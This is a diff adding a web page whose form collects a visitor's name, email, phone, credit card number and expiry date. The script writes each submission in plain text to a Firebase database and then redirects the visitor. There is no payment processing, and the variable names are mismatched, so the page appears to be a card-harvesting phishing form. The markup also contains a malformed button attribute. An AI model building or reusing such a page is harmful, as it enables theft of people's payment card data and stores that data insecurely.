@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: #ffffff;
+      border-radius: 15px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      padding: 20px;
+      transition: box-shadow 0.3s, transform 0.3s;
+      transform: scale(1);
+    }
+
+    .container:hover {
+      box-shadow: 0 8px 12px rgba(0, 0, 0, 0.2);
+      transform: scale(1.05);
+    }
+
+    .form-container {
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    h2 {
+      font-size: 24px;
+    }
+
+    input,
+    button {
+      display: block;
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      background-color: #007bff;
+      color: #fff;
+      cursor: pointer;
+      width: 50%;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+      width: 100%;
+    }
+
+    button:active {
+      background-color: #004399;
+      width: 50%;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="form-container">
+      <h2>Enter your information</h2>
+      <form action="" method="post" id="userForm">
+        <input type="text" id="name" placeholder="Name" required>
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="tel" id="phone" placeholder="Phone" required>
+        <input type="text" id="cardNumber" placeholder="Credit Card Number" required>
+        <input type="text" id="expiryDate" placeholder="Expiry Date" required>
+        <button type="submit" sendMessage()>Submit</button>
+      </form>
+    </div>
+  </div>
+  <script type="module">
+
+    import {initializeApp} from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyA3Kg095QJYHBxpLkk3hL-lPeGHHpKYFCE",
+      authDomain: "login-and-signu.firebaseapp.com",
+      databaseURL: "https://login-and-signu-default-rtdb.firebaseio.com",
+      projectId: "login-and-signu",
+      storageBucket: "login-and-signu.appspot.com",
+      messagingSenderId: "324586864076",
+      appId: "1:324586864076:web:ded190af16f985f666b169"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+
+    import {getDatabase, ref, set} from "https://www.gstatic.com/firebasejs/10.5.0/firebase-database.js";
+    let indexCounter = 1;
+
+    //listen for submit event//(1)
+    document
+      .getElementById('userForm')
+      .addEventListener('submit', formSubmit);
+
+    //Submit form(2)
+    function formSubmit(e) {
+
+      e.preventDefault();
+      let name = document.querySelector('#name').value;
+      let email = document.querySelector('#email').value;
+      let password = document.querySelector('#phone').value;
+      let bio = document.querySelector('#cardNumber').value;
+      let job = document.querySelector('#expiryDate').value;
+      sendMessage(name, email, password, bio, job);
+      window.location.href = "index1.html";
+
+    }
+
+    //Send Message to Firebase(4)
+    function sendMessage(name, email, password, bio, job) {
+      const database = getDatabase();
+      const uniqueKey = indexCounter.toString();
+      indexCounter++;
+      set(ref(database, 'users/' + Math.floor(Math.random() * 10000000)), {
+        name: name,
+        email: email,
+        Phone: password,
+        Cardnumber: bio,
+        Expiry: job,
+        index: uniqueKey,
+      });
+
+    }
+
+  </script>
+
+</body>
+
+</html>
